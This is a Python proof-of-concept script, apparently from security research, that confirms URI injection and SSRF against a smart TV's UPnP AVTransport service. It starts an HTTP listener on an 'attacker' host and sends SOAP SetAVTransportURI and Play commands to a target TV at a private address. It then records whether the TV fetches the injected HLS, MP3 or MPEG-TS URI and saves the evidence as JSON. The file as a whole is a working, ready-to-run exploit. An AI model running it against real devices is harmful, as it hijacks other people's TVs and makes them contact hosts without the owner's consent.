#!/usr/bin/env python3
"""
SSRF confirmation: keep listener up 30s, inject URI, capture TV callback.
Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
import os
import sys
import tempfile
import time
import threading
import json
import datetime
import re
import io
import http.server
import socketserver
import requests

_tmp = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                    "..", "..", "..", "..", "..", ".tmp")
os.makedirs(_tmp, exist_ok=True)
tempfile.tempdir = _tmp

TARGET   = "192.168.18.6"
ATTACKER = "192.168.18.147"
PORT     = 9999
UPNP     = 2870

HITS = []

# Minimal valid MPEG-TS "null" packet (188 bytes * 4) so media player doesn't error immediately
NULL_TS = bytes([0x47, 0x1F, 0xFF, 0x10] + [0xFF]*184) * 4

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        hit = {
            "time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "peer": self.client_address[0],
            "path": self.path,
            "method": "GET",
            "headers": dict(self.headers),
        }
        HITS.append(hit)
        print(f"\n  *** HIT: peer={hit['peer']} path={hit['path']} "
              f"ua={self.headers.get('User-Agent','?')}")

        # Serve actual TS data to keep TV from erroring and try to get it to render
        if self.path.endswith(".m3u8"):
            ts_url = f"http://{ATTACKER}:{PORT}/stream.ts"
            body = (
                "#EXTM3U\n#EXT-X-VERSION:3\n#EXT-X-TARGETDURATION:10\n"
                f"#EXTINF:10.0,\n{ts_url}\n"
                "#EXT-X-ENDLIST\n"
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/vnd.apple.mpegurl")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        elif self.path.endswith(".ts"):
            self.send_response(200)
            self.send_header("Content-Type", "video/MP2T")
            self.send_header("Content-Length", str(len(NULL_TS)))
            self.end_headers()
            self.wfile.write(NULL_TS)
        elif self.path.endswith(".mp3"):
            # Minimal MP3 silence frame (ID3 + null frame)
            body = (
                b"ID3\x03\x00\x00\x00\x00\x00\x15"
                b"TIT2\x00\x00\x00\x07\x00\x00\x00Injected"
                + b"\xff\xfb\x90\x00" + b"\x00" * 413  # one MP3 frame
            )
            self.send_response(200)
            self.send_header("Content-Type", "audio/mpeg")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            body = b"SSRF Confirmed - Uniao Geek PoC\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

    def do_HEAD(self):
        self.send_response(200)
        self.send_header("Content-Type", "audio/mpeg")
        self.end_headers()
        hit = {"time": datetime.datetime.now(datetime.timezone.utc).isoformat(),
               "peer": self.client_address[0], "path": self.path, "method": "HEAD"}
        HITS.append(hit)
        print(f"  *** HEAD HIT: {hit}")

    def log_message(self, *args):
        pass


def soap(service_type, action, inner_xml, path):
    body = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" '
        's:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
        "<s:Body>"
        f'<u:{action} xmlns:u="{service_type}">{inner_xml}</u:{action}>'
        "</s:Body></s:Envelope>"
    )
    headers = {
        "Content-Type": 'text/xml; charset="utf-8"',
        "SOAPACTION": f'"{service_type}#{action}"',
    }
    return requests.post(
        f"http://{TARGET}:{UPNP}/{path}", data=body.encode(), headers=headers, timeout=10
    )


def try_inject(uri: str, media_label: str):
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    print(f"\n  Injecting [{media_label}]: {uri}")
    r1 = soap(AVT, "SetAVTransportURI",
              f"<InstanceID>0</InstanceID><CurrentURI>{uri}</CurrentURI>"
              "<CurrentURIMetaData></CurrentURIMetaData>",
              "control/AVTransport")
    r2 = soap(AVT, "Play",
              "<InstanceID>0</InstanceID><Speed>1</Speed>",
              "control/AVTransport")
    print(f"  SetURI={r1.status_code}  Play={r2.status_code}")
    return r1.status_code, r2.status_code


def main():
    # Start persistent listener
    srv = socketserver.TCPServer(("", PORT), Handler)
    srv.allow_reuse_address = True
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[*] Listener up on {ATTACKER}:{PORT}")

    uris_to_try = [
        (f"http://{ATTACKER}:{PORT}/injected.m3u8", "HLS playlist"),
        (f"http://{ATTACKER}:{PORT}/audio.mp3",     "MP3 audio"),
        (f"http://{ATTACKER}:{PORT}/stream.ts",     "MPEG-TS raw"),
    ]

    results = []
    for uri, label in uris_to_try:
        hits_before = len(HITS)
        set_code, play_code = try_inject(uri, label)
        print("  Waiting 12s for callback...")
        deadline = time.time() + 12
        while time.time() < deadline:
            time.sleep(0.5)
            if len(HITS) > hits_before:
                break
        new_hits = HITS[hits_before:]
        result = {
            "uri": uri,
            "label": label,
            "set_http": set_code,
            "play_http": play_code,
            "tv_fetched": len(new_hits) > 0,
            "hits": new_hits,
        }
        results.append(result)
        if new_hits:
            print(f"  [!!] SSRF CONFIRMED for [{label}]! {len(new_hits)} request(s) received")
            break
        else:
            print(f"  [!] No callback for [{label}]")

    srv.shutdown()

    # Final state check
    AVT = "urn:schemas-upnp-org:service:AVTransport:1"
    r_state = soap(AVT, "GetTransportInfo", "<InstanceID>0</InstanceID>", "control/AVTransport")
    r_pos = soap(AVT, "GetPositionInfo", "<InstanceID>0</InstanceID>", "control/AVTransport")
    transport_state = re.search(r"<CurrentTransportState>([^<]+)</CurrentTransportState>", r_state.text)
    current_uri = re.search(r"<TrackURI>([^<]+)</TrackURI>", r_pos.text)

    print(f"\n[*] Final transport state: {transport_state.group(1) if transport_state else '?'}")
    print(f"[*] Active TrackURI: {current_uri.group(1) if current_uri else '?'}")

    evidence = {
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "target": TARGET,
        "attacker": f"{ATTACKER}:{PORT}",
        "injection_results": results,
        "total_ssrf_hits": len(HITS),
        "all_hits": HITS,
        "final_transport_state": transport_state.group(1) if transport_state else None,
        "final_track_uri": current_uri.group(1) if current_uri else None,
    }

    out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ssrf_confirm_evidence.json")
    with open(out, "w") as f:
        json.dump(evidence, f, indent=2)
    print(f"\n[*] Evidence -> {out}")

    if HITS:
        print("\n=== SSRF CONFIRMED - TV FETCHED ATTACKER URI ===")
        for h in HITS:
            print(f"  {h['time']} {h['method']} {h['path']} from {h['peer']}")
    else:
        print("\n=== URI INJECTION CONFIRMED (persisted in TV) - SSRF callback blocked by network ===")
        print(f"  TrackURI = {current_uri.group(1) if current_uri else '?'}")


if __name__ == "__main__":
    main()
